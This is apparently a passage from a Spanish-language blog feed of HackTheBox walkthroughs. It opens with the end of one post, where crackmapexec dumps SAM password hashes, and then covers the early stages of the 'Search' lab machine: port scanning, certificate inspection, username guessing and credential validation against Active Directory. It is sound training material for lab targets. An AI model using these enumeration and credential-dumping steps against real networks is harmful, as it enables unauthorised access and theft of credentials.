<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.116.26 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'4dD!5}x/re8]FBuZ'</span> <span class="nt">--sam</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] SupportDesk<span class="se">\A</span>dministrator:4dD!5<span class="o">}</span>x/re8]FBuZ <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Dumping SAM hashes
SMB         10.129.116.26   445    SUPPORTDESK      Administrator:500:aad3b435b51404eeaad3b435b51404ee:10f08e9e3787aec843594cfd01f1a6a5:::
SMB         10.129.116.26   445    SUPPORTDESK      Guest:501:aad3b435b51404eeaad3b435b51404ee:d5dd356a1d8a41ceafcd92f3e1795a71:::
SMB         10.129.116.26   445    SUPPORTDESK      DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.116.26   445    SUPPORTDESK      WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:83f0f384401e2cb89df6f920af3254c7:::
SMB         10.129.116.26   445    SUPPORTDESK      Hazard:1008:aad3b435b51404eeaad3b435b51404ee:551f5fc818a8c5b65d19be1c977f5326:::
SMB         10.129.116.26   445    SUPPORTDESK      support:1009:aad3b435b51404eeaad3b435b51404ee:04456c45a7adb052b6a315cb64992516:::
SMB         10.129.116.26   445    SUPPORTDESK      Chase:1012:aad3b435b51404eeaad3b435b51404ee:bb2e1bf236b6219cb45811d5f2d55068:::
SMB         10.129.116.26   445    SUPPORTDESK      Jason:1013:aad3b435b51404eeaad3b435b51404ee:10608c8436315acb9c703aa7b2e04750:::
SMB         10.129.116.26   445    SUPPORTDESK      <span class="o">[</span>+] Added 8 SAM hashes to the database
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Search (hard)</title><link href="http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html" rel="alternate" type="text/html" title="HackTheBox - Search (hard)" /><published>2024-04-12T00:00:00-06:00</published><updated>2024-04-12T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/hard/2024/04/12/search</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/hard/2024/04/12/search.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/03cea0fc2ebc50151c0dfa9e375e3ded.png" />
</p>

<ul>
  <li>En este post vamos a estar resolviendo la maquina Search de la plataforma de Hack The Box que es un entorno de Directorio Activo donde vamos a estar enumerando por los protocolos SMB, RPC, además de estar haciendo un Kerberoast attack y obtener un XLSX que contiene data muy importante como usuarios y credenciales que usaremos para obtener certificados y conectarnos a un Windows PowerShell Web Access donde gracias a bloodhound sabremos la vía para escalar privilegios le vamos a cambiar la contraseña a un usuario que pertenece dentro del grupo Domain Admins y nos conectaremos con wmiexec para ver la ultima flag.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando puertos y viendo sus tecnologías que corren en los puertos abiertos por el protocolo <code class="language-plaintext highlighter-rouge">TCP</code>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th>Uso</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-p-</td>
      <td>Escanear todo el rango de puertos (65535) por el protocolo TCP.</td>
    </tr>
    <tr>
      <td>–open</td>
      <td>Solo queremos ver puertos abiertos.</td>
    </tr>
    <tr>
      <td>-sS</td>
      <td>TCP SYN Stealth, Nmap realiza un escaneo de tipo SYN, envía paquetes SYN (Synchronize) a los puertos de destinosi recibe un paquete SYN/ACK (Synchronize/Acknowledge), esto indica que el puerto está abierto. Si recibe un paquete RST (Reset), significa que el puerto está cerrado. Esta técnica es útil porque puede ayudar a evadir ciertos tipos de firewalls.</td>
    </tr>
    <tr>
      <td>–min-rate 5000</td>
      <td>Vamos a emitir al menos 5000 paquetes por segundo para ir mucho mas rápido.</td>
    </tr>
    <tr>
      <td>-vvv</td>
      <td>Para que nos reporte los puertos que vaya encontrando por la consola.</td>
    </tr>
    <tr>
      <td>-n</td>
      <td>Para que no aplique resolución DNS.</td>
    </tr>
    <tr>
      <td>-Pn</td>
      <td>Esto es para indicarle que omita el descubrimiento de hosts.</td>
    </tr>
    <tr>
      <td>-oG</td>
      <td>Para exportar la salida en formato Greppable.</td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.129.229.57 <span class="nt">-oG</span> allPorts
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-07 14:28 CST
Initiating SYN Stealth Scan at 14:28
Scanning 10.129.229.57 <span class="o">[</span>65535 ports]
Discovered open port 139/tcp on 10.129.229.57
Discovered open port 135/tcp on 10.129.229.57
Discovered open port 80/tcp on 10.129.229.57
Discovered open port 53/tcp on 10.129.229.57
Discovered open port 445/tcp on 10.129.229.57
Discovered open port 443/tcp on 10.129.229.57
Discovered open port 9389/tcp on 10.129.229.57
Discovered open port 49724/tcp on 10.129.229.57
Discovered open port 3269/tcp on 10.129.229.57
Discovered open port 8172/tcp on 10.129.229.57
Discovered open port 49699/tcp on 10.129.229.57
Discovered open port 3268/tcp on 10.129.229.57
Discovered open port 49692/tcp on 10.129.229.57
Discovered open port 464/tcp on 10.129.229.57
Discovered open port 389/tcp on 10.129.229.57
Increasing send delay <span class="k">for </span>10.129.229.57 from 0 to 5 due to 12 out of 38 dropped probes since last increase.
Discovered open port 88/tcp on 10.129.229.57
Increasing send delay <span class="k">for </span>10.129.229.57 from 5 to 10 due to 11 out of 20 dropped probes since last increase.
Completed SYN Stealth Scan at 14:29, 67.08s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.129.229.57
Host is up, received user-set <span class="o">(</span>0.44s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2024-04-07 14:28:44 CST <span class="k">for </span>67s
Not shown: 65519 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
8172/tcp  open  unknown          syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49692/tcp open  unknown          syn-ack ttl 127
49699/tcp open  unknown          syn-ack ttl 127
49724/tcp open  unknown          syn-ack ttl 127
</code></pre></div></div>

<ul>
  <li>Ahora usamos la función <code class="language-plaintext highlighter-rouge">extractPorts</code> para copear los puertos abiertos a la <code class="language-plaintext highlighter-rouge">clipboard</code> y escanear los servicios que corren en los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap which extractPorts
extractPorts <span class="o">()</span> <span class="o">{</span>
	<span class="nv">ports</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,5}/open'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s1">'/'</span> | xargs | <span class="nb">tr</span> <span class="s1">' '</span> <span class="s1">','</span><span class="si">)</span><span class="s2">"</span>
	<span class="nv">ip_address</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$1</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="si">)</span><span class="s2">"</span>
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[*] Extracting information...</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] IP Address: </span><span class="nv">$ip_address</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">[*] Open ports: </span><span class="nv">$ports</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">echo</span> <span class="nv">$ports</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip
	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"[*] Ports copied to clipboard</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> extractPorts.tmp
	<span class="nb">cat </span>extractPorts.tmp
	<span class="nb">rm </span>extractPorts.tmp
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>La ejecutamos y nos copea los puertos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap extractPorts allPorts

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...

	<span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.129.229.57
	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 53,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<ul>
  <li>Ahora seguimos con el escaneo de los servicios de los puertos abiertos.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Uso</th>
      <th>Párametro</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Que nos reporte las tecnologías y servicios que están corriendo en los puertos abiertos.</td>
      <td>-sCV</td>
    </tr>
    <tr>
      <td>Que no lo exporte a un archivo normal.</td>
      <td>-oN</td>
    </tr>
  </tbody>
</table>

<ul>
  <li>Y listo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,139,389,443,445,464,3268,3269,8172,9389,49692,49699,49724 10.129.229.57 <span class="nt">-oN</span> targeted
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-07 14:48 CST
Nmap scan report <span class="k">for </span>10.129.229.57
Host is up <span class="o">(</span>0.49s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &amp;mdash<span class="p">;</span> Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-07 20:49:07Z<span class="o">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-title: Search &amp;mdash<span class="p">;</span> Just Testing IIS
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| http-methods:
|_  Potentially risky methods: TRACE
| tls-alpn:
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: search.htb0., Site: Default-First-Site-Name<span class="o">)</span>
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2024-04-07T20:50:38+00:00<span class="p">;</span> 0s from scanner time.
| tls-alpn:
|_  http/1.1
|_http-title: Site doesn<span class="s1">'t have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        .NET Message Framing
49692/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-04-07T20:50:03
|_  start_date: N/A
</span></code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>Vemos el puerto 80 abierto vamos a ver las tecnologías que se están empleando.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">youremail</span><span class="vi">@search</span><span class="p">.</span><span class="nf">htb</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">229.57</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">[</span><span class="mf">3.3</span><span class="o">.</span><span class="mi">1</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Search</span> <span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span> <span class="no">Just</span> <span class="no">Testing</span> <span class="no">IIS</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos un posible subdominio existente en la maquina que se llama <code class="language-plaintext highlighter-rouge">search.htb</code> así que vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> en caso de que se este aplicando <code class="language-plaintext highlighter-rouge">Virtual Hosting</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.129.229.57 search.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.229.57 search.htb
</code></pre></div></div>

<ul>
  <li>Aquí vemos el mismo nombre si usamos <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.129.229.57
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Tenemos muchos puertos abiertos pero como estamos ante un Entorno de Directorio Activo podemos comenzar enumerando el servicio <code class="language-plaintext highlighter-rouge">RPC</code> para ver si podemos enumerar usuarios del dominio empleando un <code class="language-plaintext highlighter-rouge">Null Session</code> por que no disponemos de credenciales.</p>
  </li>
  <li>
    <p>No podemos enumerar.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.129.229.57 <span class="nt">-N</span>
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>No encontramos nada por que necesitamos de disponer de credenciales validas pero también tenemos el puerto 443 abierto podemos inspeccionar el certificado por casi siempre encontramos información valiosa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap openssl s_client <span class="nt">-connect</span> 10.129.229.57:443
CONNECTED<span class="o">(</span>00000003<span class="o">)</span>
Can<span class="s1">'t use SSL_get_servername
depth=0 CN = research.search.htb, CN = research
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = research.search.htb, CN = research
verify error:num=21:unable to verify the first certificate
verify return:1
depth=0 CN = research.search.htb, CN = research
verify return:1
---
Certificate chain
 0 s:CN = research.search.htb, CN = research
   i:DC = htb, DC = search, CN = search-RESEARCH-CA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Aug 11 08:13:35 2020 GMT; NotAfter: Aug  9 08:13:35 2030 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFZzCCBE+gAwIBAgITVAAAABRx/RXdaDt/5wAAAAAAFDANBgkqhkiG9w0BAQsF
ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODExMDgxMzM1WhcN
MzAwODA5MDgxMzM1WjAxMRwwGgYDVQQDExNyZXNlYXJjaC5zZWFyY2guaHRiMREw
DwYDVQQDEwhyZXNlYXJjaDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AJryZQO0w3Fil8haWl73Hh2HNnwxC3RxcPGE3QrXLglc2zwp1AsHLAKhUOuAq/Js
OMyVBQZo13cmRh8l7XOcSXUI4YV/ezXr7GbznlN9NTGooZkzYuMBa21afqTjBgPk
VYByyfYcECv8TvKI7uc78TpkwpZfmAKi6ha/7o8A1rCSipDvp5wtChLsDK9bsEfl
nlQbMR8SBQFrWWjXIvCGH2KNkOI56Xz9HV9F2JGwJZNWrHml7BuK18g9sMs0/p7G
BZxaQLW18zOQnKt3lNo97ovV7A2JljEkknR4MckN4tAEDmOFLvTcdAQ6Y3THvvcr
UMg24FrX1i8J5WKfjjRdhvkCAwEAAaOCAl0wggJZMDwGCSsGAQQBgjcVBwQvMC0G
JSsGAQQBgjcVCIqrSYT8vHWlnxuHg8xchZLMMYFpgcOKV4GUuG0CAWQCAQUwEwYD
VR0lBAwwCgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMBsGCSsGAQQBgjcVCgQO
MAwwCgYIKwYBBQUHAwEwHQYDVR0OBBYEFFX1E0g3TlBigM7mdF25TuT8fM/dMB8G
A1UdIwQYMBaAFGqRrXsob7VIpls4zrxiql/nV+xQMIHQBgNVHR8EgcgwgcUwgcKg
gb+ggbyGgblsZGFwOi8vL0NOPXNlYXJjaC1SRVNFQVJDSC1DQSxDTj1SZXNlYXJj
aCxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMs
Q049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NlcnRpZmljYXRlUmV2
b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2lu
dDCBwwYIKwYBBQUHAQEEgbYwgbMwgbAGCCsGAQUFBzAChoGjbGRhcDovLy9DTj1z
ZWFyY2gtUkVTRUFSQ0gtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2VhcmNoLERDPWh0
Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAOkRDrr85ypJJcgefRXJMcVduM0xK
JT1TzlSgPMw6koXP0a8uR+nLM6dUyU8jfwy5nZDz1SGoOo3X42MTAr6gFomNCj3a
FgVpTZq90yqTNJEJF9KosUDd47hsBPhw2uu0f4k0UQa/b/+C0Zh5PlBWeoYLSru+
JcPAWC1o0tQ3MKGogFIGuXYcGcdysM1U+Ho5exQDMTKEiMbSvP9WV52tEnjAvmEe
7/lPqiPHGIs7mRW/zXRMq7yDulWUdzAcxZxYzqHQ4k5bQnuVkGEw0d1dcFsoGEKj
7pdPzYPnCzHLoO/BDAKJvOrYfI4BPNn2JDBs46CkUwygpiJpL7zIYvCUDQ==
-----END CERTIFICATE-----
subject=CN = research.search.htb, CN = research
issuer=DC = htb, DC = search, CN = search-RESEARCH-CA
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA
Server Temp Key: ECDH, secp384r1, 384 bits
---
SSL handshake has read 1907 bytes and written 581 bytes
Verification error: unable to verify the first certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: DD43000058B89B34DEC8D6F721AFE9AE4CD04A82C34216BE763E4ADCE3E1E92F
    Session-ID-ctx:
    Master-Key: 9DC677241F4C42AEFDA506C7334AD059E4B16040E59E07F6E820712A1E3A7B821A639EF56E7574ACD0B809159AECB46D
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1712523918
    Timeout   : 7200 (sec)
    Verify return code: 21 (unable to verify the first certificate)
    Extended master secret: yes
---
</span></code></pre></div></div>

<ul>
  <li>Encontramos un subdominio a si que vamos agregarlo al <strong>/etc/hosts</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
10.129.229.57 search.htb research.search.htb
</code></pre></div></div>

<ul>
  <li>Pero si vemos las paginas webs vemos que las 3 son los mismo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/1.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/3.png" />
</p>

<h2 id="hopesharp">hope.sharp</h2>

<ul>
  <li>Si vemos en las imágenes que nos muestran en la web hay una contraseña y un usuario básicamente un <code class="language-plaintext highlighter-rouge">Information Leakage</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/4.png" />
</p>

<ul>
  <li>Para validar si es un usuario valido vamos a hacer varios ejemplos del nombre de usuario por que no sabemos como es que lo representa a si que vamos a crear un <code class="language-plaintext highlighter-rouge">.txt</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
hopesharp
h.sharp
hope.s
h.sharp
hope.sharp
H.Sharp
Hope.Sharp
</code></pre></div></div>

<ul>
  <li>Podemos hacerlo con <code class="language-plaintext highlighter-rouge">kerbrute</code> o con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.229.57 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'IsolationIsKey?'</span> <span class="nt">--continue-on-success</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:RESEARCH<span class="o">)</span> <span class="o">(</span>domain:search.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>opesharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>ope.s:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\h</span>.sharp:IsolationIsKey? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\h</span>ope.sharp:IsolationIsKey?
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.229.57   445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\H</span>ope.Sharp:IsolationIsKey?
</code></pre></div></div>

<ul>
  <li>Básicamente es el mismo usuario <code class="language-plaintext highlighter-rouge">Hope.Sharp</code> y <code class="language-plaintext highlighter-rouge">hope.sharp</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content ./kerbrute userenum <span class="nt">-d</span> search.htb <span class="nt">--dc</span> research.search.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/07/24 - Ronnie Flathers @ropnop

2024/04/07 15:24:20 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/07 15:24:20 <span class="o">&gt;</span>  	research.search.htb:88

2024/04/07 15:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Hope.Sharp@search.htb
2024/04/07 15:24:20 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 hope.sharp@search.htb
2024/04/07 15:24:20 <span class="o">&gt;</span>  Done! Tested 7 usernames <span class="o">(</span>2 valid<span class="o">)</span> <span class="k">in </span>0.096 seconds
</code></pre></div></div>

<ul>
  <li>Si recordamos tenemos el <code class="language-plaintext highlighter-rouge">RPC</code> abierto y como ahora si tenemos credenciales vamos a conectarnos para enumerar usuarios.</li>
</ul>

